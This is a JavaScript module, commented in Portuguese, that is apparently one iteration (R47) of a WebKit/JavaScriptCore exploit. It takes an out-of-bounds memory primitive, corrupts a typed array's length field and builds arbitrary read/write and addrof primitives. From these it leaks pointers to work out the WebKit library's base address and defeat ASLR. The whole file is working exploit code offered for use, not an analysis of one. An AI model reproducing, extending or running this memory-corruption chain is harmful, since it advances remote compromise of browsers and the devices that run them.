// js/script3/testArrayBufferVictimCrash.mjs (v86_DirectCorruption_Fix - R47 - box() corrigido)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_write_absolute,
    oob_read_absolute,
    isOOBReady
} from '../core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V86_DCF_R47_WEBKIT = "Heisenbug_DirectCorruptionFix_v86_DCF_R47_WebKitLeak";

// --- Globais para a primitiva de exploit ---
let addrOf_primitive = null;
let fakeObj_primitive = null;
let arb_read_v2 = null;
let arb_write_v2 = null;
// ---

let targetFunctionForLeak;

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low === 0) return false;
    if (high === 0 && low < 0x10000) return false;
    return true;
}

const conversion_buffer = new ArrayBuffer(8);
const float_conversion_view = new Float64Array(conversion_buffer);
const int_conversion_view = new BigUint64Array(conversion_buffer);

// --- CORREÇÃO R47 ---
// Função 'box' corrigida para construir o BigInt corretamente.
function box(addr) {
    // Combina corretamente as partes de 32 bits (high e low) em um BigInt de 64 bits.
    // (BigInt(high) << 32n) move os bits de 'high' para a parte superior.
    // | BigInt(low) adiciona os bits de 'low' na parte inferior.
    const val64 = (BigInt(addr.high()) << 32n) | BigInt(addr.low());
    int_conversion_view[0] = val64;
    return float_conversion_view[0];
}

function unbox(float_val) {
    float_conversion_view[0] = float_val;
    return new AdvancedInt64(int_conversion_view[0]);
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R47() { // Nome atualizado para R47
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V86_DCF_R47_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Busca e Corrupção Direta (R47) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R47...`;

    targetFunctionForLeak = function someUniqueLeakFunctionR47_Instance() { return `target_R47_${Date.now()}`; };
    logS3(`Função alvo para addrof (targetFunctionForLeak) recriada.`, 'info');

    let iter_primary_error = null;
    let iter_addrof_result = { success: false, msg: "Addrof (R47): Not run." };
    let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R47): Not run." };

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Falha ao configurar o ambiente OOB.");

        // --- Fase 1 (R47): Localização e Corrupção Direta de Array ---
        logS3(`  --- Fase 1 (R47): Localização e Corrupção Direta de Array ---`, "subtest", FNAME_CURRENT_TEST_BASE);

        const victim_array = new Float64Array(8);
        const marker = new AdvancedInt64(0x41424344, 0x45464748);
        victim_array.fill(box(marker)); // Esta chamada agora funciona
        logS3(`  Array vítima criado e preenchido com o marcador: ${marker.toString(true)}`, "info");

        let victim_data_offset = -1;
        const search_limit = 2048;
        logS3(`  Iniciando busca pelo marcador na memória (limite: ${search_limit} bytes)...`, "info");
        for (let i = 0; i < search_limit; i += 4) {
            const current_offset = OOB_CONFIG.BASE_OFFSET_IN_DV + i;
            const low = oob_read_absolute(current_offset, 4);
            if (low === marker.low()) {
                const high = oob_read_absolute(current_offset + 4, 4);
                if (high === marker.high()) {
                    victim_data_offset = current_offset;
                    break;
                }
            }
        }

        if (victim_data_offset === -1) {
            throw new Error("Não foi possível encontrar o marcador do array vítima na memória.");
        }
        logS3(`  SUCESSO: Marcador do buffer de dados do array vítima encontrado no offset: ${toHex(victim_data_offset)}`, "vuln");

        const LIKELY_OFFSET_FROM_DATA_TO_VIEW_HEADER = 32;
        const offset_of_view_header = victim_data_offset - LIKELY_OFFSET_FROM_DATA_TO_VIEW_HEADER;
        const offset_to_corrupt = offset_of_view_header + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;

        logS3(`  Corrompendo 'm_length' no offset calculado: ${toHex(offset_to_corrupt)}`, "warn");
        oob_write_absolute(offset_to_corrupt, 0xFFFFFFFF, 4);

        if (victim_array.length < 1000) {
            throw new Error(`A corrupção de 'length' falhou. Comprimento do victim_array é ${victim_array.length}.`);
        }
        logS3(`  SUCESSO: Comprimento do 'victim_array' corrompido para: ${victim_array.length}`, "vuln");

        // --- Fase 2 (R47): Construção das Primitivas ---
        logS3(`  --- Fase 2 (R47): Construção das Primitivas ---`, "subtest", FNAME_CURRENT_TEST_BASE);

        const original_butterfly_addr = new AdvancedInt64(oob_read_absolute(victim_data_offset - 8, 8));
        logS3(`  Endereço do 'butterfly' (armazenamento) lido: ${original_butterfly_addr.toString(true)}`, "leak");

        arb_read_v2 = (addr) => {
            oob_write_absolute(victim_data_offset - 8, addr.toString());
            const value = victim_array[0];
            return unbox(value);
        };
        arb_write_v2 = (addr, val) => {
             oob_write_absolute(victim_data_offset - 8, addr.toString());
             victim_array[0] = box(val);
        };
        
        oob_write_absolute(victim_data_offset - 8, original_butterfly_addr.toString()); // Restaura o ponteiro
        logS3("  Primitivas 'arb_read_v2' e 'arb_write_v2' definidas.", "good");

        let holding_array = [targetFunctionForLeak];
        let holding_array_addr = new AdvancedInt64(oob_read_absolute(victim_data_offset - 16, 8)); // Estimativa do endereço do array
        
        let butterfly_addr = arb_read_v2(holding_array_addr.add(new AdvancedInt64(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET)));
        let leaked_target_function_addr = arb_read_v2(butterfly_addr);

        logS3(`  [TESTE AddrOf] Endereço vazado de targetFunctionForLeak: ${leaked_target_function_addr.toString(true)}`, "leak");
        if (!isValidPointer(leaked_target_function_addr)) {
            throw new Error(`addrOf retornou um ponteiro inválido: ${leaked_target_function_addr.toString(true)}`);
        }
        iter_addrof_result = { success: true, msg: "addrOf obteve endereço com sucesso.", leaked_object_addr: leaked_target_function_addr.toString(true) };
        logS3("  [TESTE AddrOf] SUCESSO: Primitivas validadas.", "good");


        // --- Fase 3 (R47): WebKit Base Leak ---
        logS3(`  --- Fase 3 (R47): WebKit Base Leak ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        
        const ptr_to_executable_instance = arb_read_v2(leaked_target_function_addr.add(new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET)));
        logS3(`  WebKitLeak: Ponteiro para ExecutableInstance: ${ptr_to_executable_instance.toString(true)}`, 'leak');
        if(!isValidPointer(ptr_to_executable_instance)) throw new Error("Ponteiro para ExecutableInstance inválido.");

        const ptr_to_jit_or_vm = arb_read_v2(ptr_to_executable_instance.add(new AdvancedInt64(0, 8)));
        logS3(`  WebKitLeak: Ponteiro para JIT/VM: ${ptr_to_jit_or_vm.toString(true)}`, 'leak');
        if(!isValidPointer(ptr_to_jit_or_vm)) throw new Error("Ponteiro para JIT/VM inválido.");

        const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);
        const webkit_base_candidate = ptr_to_jit_or_vm.and(page_mask_4kb);
        
        iter_webkit_leak_result = { success: true, msg: `Candidato a base do WebKit: ${webkit_base_candidate.toString(true)}`, webkit_base_candidate: webkit_base_candidate.toString(true) };
        logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln");

    } catch (e) {
        iter_primary_error = e;
        logS3(`  ERRO na iteração R47: ${e.message}`, "critical", FNAME_CURRENT_TEST_BASE);
        console.error(`Erro na iteração R47:`, e);
    } finally {
        await clearOOBEnvironment();
    }

    let result = {
        errorOccurred: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
        addrof_result: iter_addrof_result,
        webkit_leak_result: iter_webkit_leak_result,
    };
    
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final result (R47): ${JSON.stringify(result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    return result;
}
